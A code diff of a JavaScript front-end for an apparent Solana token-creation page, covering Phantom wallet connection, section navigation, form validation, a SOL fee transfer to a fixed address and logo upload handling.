@@ -1,3 +1,8 @@
+// Polyfill dla Buffer
+if (typeof Buffer === 'undefined') {
+    globalThis.Buffer = require('buffer').Buffer;
+}
+
 document.addEventListener('DOMContentLoaded', function() {
     const socialToggle = document.getElementById('social-links-toggle');
     const feeInfo = document.getElementById('fee-info');
@@ -7,7 +12,6 @@ document.addEventListener('DOMContentLoaded', function() {
     let socialFee = 0.1;
     let totalFee = baseFee;
 
-    // Function to update the fee display
     function updateFeeDisplay() {
         const additionalFees = [];
         
@@ -18,10 +22,8 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         }
         
-        // Calculate total fee
         totalFee = baseFee + additionalFees.reduce((sum, fee) => sum + fee.value, 0);
         
-        // Update display
         feeInfo.innerHTML = `
             <div class="base-fee">Base fee: <span>${baseFee} SOL</span></div>
             ${additionalFees.length > 0 ? `
@@ -38,88 +40,52 @@ document.addEventListener('DOMContentLoaded', function() {
         `;
     }
     
-    // Listen for checkbox changes
     socialToggle.addEventListener('change', updateFeeDisplay);
-    
-    // Initial update
     updateFeeDisplay();
 });
 
-// =============================================
-// MAIN SETUP
-// =============================================
-
-const APP_ENV = 'production'; // 'development' or 'production'
-const NETWORK = solanaWeb3.clusterApiUrl('mainnet-beta'); // 'devnet' for testing
-
-// =============================================
-// GLOBAL VARIABLES
-// =============================================
+// Main setup
+const APP_ENV = 'production';
+const NETWORK = solanaWeb3.clusterApiUrl('mainnet-beta');
+const RECIPIENT_ADDRESS = '69vedYimF9qjVMosphWbRTBffYxAzNAvLkWDmtnSBiWq';
 
 let wallet;
 let connection;
 let currentSection = 'home';
 
-// =============================================
-// APPLICATION INITIALIZATION
-// =============================================
-
 document.addEventListener('DOMContentLoaded', async function() {
-    // 1. Initialize connection to blockchain
     connection = new solanaWeb3.Connection(NETWORK, 'confirmed');
-    
-    // 2. Initialize wallet
     await initWallet();
-    
-    // 3. Initialize navigation
     initNavigation();
-    
-    // 4. Initialize token form
     initTokenForm();
-    
-    // 5. Initialize logo upload
     initLogoUpload();
-    
-    console.log('Application initialized');
 });
 
-// =============================================
-// PHANTOM WALLET INTEGRATION
-// =============================================
-
 async function initWallet() {
-    // Development mode (mock Phantom if not available)
     if (APP_ENV === 'development' && !window.solana) {
-        console.warn('Development mode - Phantom is not available');
+        console.warn('Development mode - Phantom mock');
         window.solana = {
-            connect: async () => ({ 
-                publicKey: { 
-                    toString: () => 'DEV_TEST_WALLET' 
-                } 
-            }),
+            connect: async () => ({ publicKey: { toString: () => 'DEV_WALLET' } }),
             isConnected: false,
             on: () => {},
             disconnect: async () => {}
         };
     }
 
-    if (!window.solana) {
+    if (!window.solana?.isPhantom) {
         console.error('Phantom Wallet not available!');
         return;
     }
 
     wallet = window.solana;
     
-    // Auto-connect if wallet is already connected
     if (wallet.isConnected) {
         await handleWalletConnect();
     }
     
-    // Event listeners for wallet
     wallet.on('connect', handleWalletConnect);
     wallet.on('disconnect', handleWalletDisconnect);
     
-    // Connect button initialization
     document.getElementById('connect-wallet').addEventListener('click', toggleWalletConnection);
 }
 
@@ -142,44 +108,31 @@ async function handleWalletConnect() {
     
     if (wallet && wallet.publicKey) {
         const shortAddress = `${wallet.publicKey.toString().slice(0, 4)}...${wallet.publicKey.toString().slice(-4)}`;
-        
         connectBtn.textContent = 'Connected';
         connectBtn.classList.add('connected');
         walletAddress.textContent = shortAddress;
         walletAddress.style.display = 'block';
-        
-        console.log('Wallet connected:', wallet.publicKey.toString());
     }
 }
 
 function handleWalletDisconnect() {
     const connectBtn = document.getElementById('connect-wallet');
     const walletAddress = document.getElementById('wallet-address');
-    
     connectBtn.textContent = 'Connect Wallet';
     connectBtn.classList.remove('connected');
     walletAddress.style.display = 'none';
-    
-    console.log('Wallet disconnected');
 }
-
-// =============================================
-// SECTION NAVIGATION
-// =============================================
 
 function initNavigation() {
     const sections = document.querySelectorAll('section');
     const navLinks = document.querySelectorAll('.nav-link');
-    
-    // Show selected section
+
     function showSection(sectionId) {
-        // Hide all sections
         sections.forEach(section => {
             section.classList.remove('active-section');
             section.classList.add('hidden-section');
         });
         
-        // Show selected section
         const targetSection = document.getElementById(sectionId);
         if (targetSection) {
             targetSection.classList.remove('hidden-section');
@@ -187,142 +140,95 @@ function initNavigation() {
             currentSection = sectionId;
         }
         
-        // Update active navigation links
         navLinks.forEach(link => {
-            if (link.getAttribute('href').startsWith('#')) {
-                link.classList.remove('active');
-                if (link.getAttribute('href') === `#${sectionId}`) {
-                    link.classList.add('active');
-                }
+            link.classList.remove('active');
+            if (link.getAttribute('href') === `#${sectionId}`) {
+                link.classList.add('active');
             }
         });
-        
-        // Scroll to top
-        window.scrollTo({ top: 0, behavior: 'smooth' });
     }
-    
-    // Event listener for navigation clicks
+
     navLinks.forEach(link => {
         link.addEventListener('click', function(e) {
             const href = this.getAttribute('href');
-            
-            // Internal links
             if (href.startsWith('#')) {
                 e.preventDefault();
-                const targetSection = href.substring(1);
-                showSection(targetSection);
+                showSection(href.substring(1));
                 history.pushState(null, null, href);
             }
         });
     });
-    
-    // Handle "Create Token" button on home page
-    const homeCreateBtn = document.querySelector('.hero-text .create-token-btn');
-    if (homeCreateBtn) {
-        homeCreateBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            showSection('create-token');
-            history.pushState(null, null, '#create-token');
-        });
-    }
-    
-    // Handle browser history
+
     window.addEventListener('popstate', function() {
         const hash = window.location.hash.substring(1);
-        if (hash && document.getElementById(hash)) {
-            showSection(hash);
-        } else {
-            showSection('home');
-        }
+        showSection(hash || 'home');
     });
-    
-    // Initialize initial section
-    const initialHash = window.location.hash.substring(1);
-    showSection(initialHash || 'home');
+
+    showSection(window.location.hash.substring(1) || 'home');
 }
 
-// =============================================
-// TOKEN CREATION FORM
-// =============================================
-
 function initTokenForm() {
-    const launchBtn = document.querySelector('.launch-token-btn');
+    const launchBtn = document.getElementById('launch-btn');
     if (!launchBtn) return;
     
-    // Social media toggle handling
     document.getElementById('social-links-toggle').addEventListener('change', function() {
-        const socialFields = document.getElementById('social-fields');
-        if (this.checked) {
-            socialFields.style.display = 'block';
-        } else {
-            socialFields.style.display = 'none';
-        }
+        document.getElementById('social-fields').style.display = this.checked ? 'block' : 'none';
     });
     
     launchBtn.addEventListener('click', async function() {
-        // Wallet validation
         if (!wallet?.isConnected) {
             alert('Please connect your Phantom Wallet first!');
             return;
         }
 
-        // Get form data
+        // Form validation
         const tokenName = document.getElementById('token-name').value.trim();
-        const tokenSymbol = document.getElementById('token-symbol').value.trim().toUpperCase();
-        const tokenDecimals = parseInt(document.getElementById('token-decimals').value);
-        const tokenSupply = parseInt(document.getElementById('token-supply').value);
-        const tokenDescription = document.getElementById('token-description').value.trim();
-
-        // Validation
+        const tokenSymbol = document.getElementById('token-symbol').value.trim();
+        const tokenSupply = document.getElementById('token-supply').value;
+        
         if (!tokenName || tokenName.length > 32) {
-            alert('Token name must be 1-32 characters long');
+            alert('Token name must be 1-32 characters');
             return;
         }
 
         if (!tokenSymbol || tokenSymbol.length > 10) {
-            alert('Token symbol must be 1-10 characters long');
+            alert('Token symbol must be 1-10 characters');
             return;
         }
 
-        if (isNaN(tokenSupply) || tokenSupply <= 0) {
+        if (!tokenSupply || isNaN(tokenSupply) || tokenSupply <= 0) {
             alert('Please enter a valid token supply');
             return;
         }
 
         try {
-            // Get current fee
-            const feeText = document.querySelector('.total-fee').textContent;
-            const totalAmount = parseFloat(feeText.match(/[\d.]+/)[0]);
-            const recipientAddress = '69vedYimF9qjVMosphWbRTBffYxAzNAvLkWDmtnSBiWq';
-
+            const amount = parseFloat(document.querySelector('.total-fee').textContent.match(/[\d.]+/)[0]);
+            
             // Create transaction
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: wallet.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: solanaWeb3.LAMPORTS_PER_SOL * totalAmount,
+                    toPubkey: new solanaWeb3.PublicKey(RECIPIENT_ADDRESS),
+                    lamports: solanaWeb3.LAMPORTS_PER_SOL * amount
                 })
             );
 
-            // Set recent blockhash
+            // Get recent blockhash
             const { blockhash } = await connection.getRecentBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.feePayer = wallet.publicKey;
 
-            // Send transaction to Phantom for approval
-            const signedTransaction = await wallet.signTransaction(transaction);
-            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-            
-            // Show success message
-            alert(`Transaction submitted!\n\nSignature: ${signature}`);
+            // Send to Phantom for signing and sending
+            const { signature } = await wallet.signAndSendTransaction(transaction);
             
             // Wait for confirmation
-            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
-            if (confirmation.value.err) {
+            const result = await connection.confirmTransaction(signature, 'confirmed');
+            
+            if (result.value.err) {
                 throw new Error('Transaction failed');
             }
             
-            alert('Transaction confirmed! Your token will be created shortly.');
+            alert(`Success! Transaction confirmed.\nSignature: ${signature}`);
             
         } catch (error) {
             console.error('Transaction error:', error);
@@ -331,22 +237,16 @@ function initTokenForm() {
     });
 }
 
-// =============================================
-// LOGO UPLOAD FUNCTIONALITY
-// =============================================
-
 function initLogoUpload() {
     const uploadArea = document.getElementById('logo-upload-area');
-    const logoInput = document.createElement('input');
-    logoInput.type = 'file';
-    logoInput.accept = '.jpg,.jpeg,.png';
-    logoInput.hidden = true;
-    document.body.appendChild(logoInput);
+    const fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.accept = 'image/*';
+    fileInput.hidden = true;
+    document.body.appendChild(fileInput);
 
-    // Handle click
-    uploadArea.addEventListener('click', () => logoInput.click());
+    uploadArea.addEventListener('click', () => fileInput.click());
 
-    // Handle drag & drop
     uploadArea.addEventListener('dragover', (e) => {
         e.preventDefault();
         uploadArea.classList.add('dragover');
@@ -360,21 +260,20 @@ function initLogoUpload() {
         e.preventDefault();
         uploadArea.classList.remove('dragover');
         if (e.dataTransfer.files.length) {
-            logoInput.files = e.dataTransfer.files;
-            handleLogoUpload(logoInput.files[0]);
+            fileInput.files = e.dataTransfer.files;
+            handleFileSelect(fileInput.files[0]);
         }
     });
 
-    // Handle file selection
-    logoInput.addEventListener('change', () => {
-        if (logoInput.files.length) {
-            handleLogoUpload(logoInput.files[0]);
+    fileInput.addEventListener('change', () => {
+        if (fileInput.files.length) {
+            handleFileSelect(fileInput.files[0]);
         }
     });
 
-    function handleLogoUpload(file) {
+    function handleFileSelect(file) {
         if (!file.type.match('image.*')) {
-            alert('Please select an image file (PNG/JPG)');
+            alert('Please select an image file');
             return;
         }
 
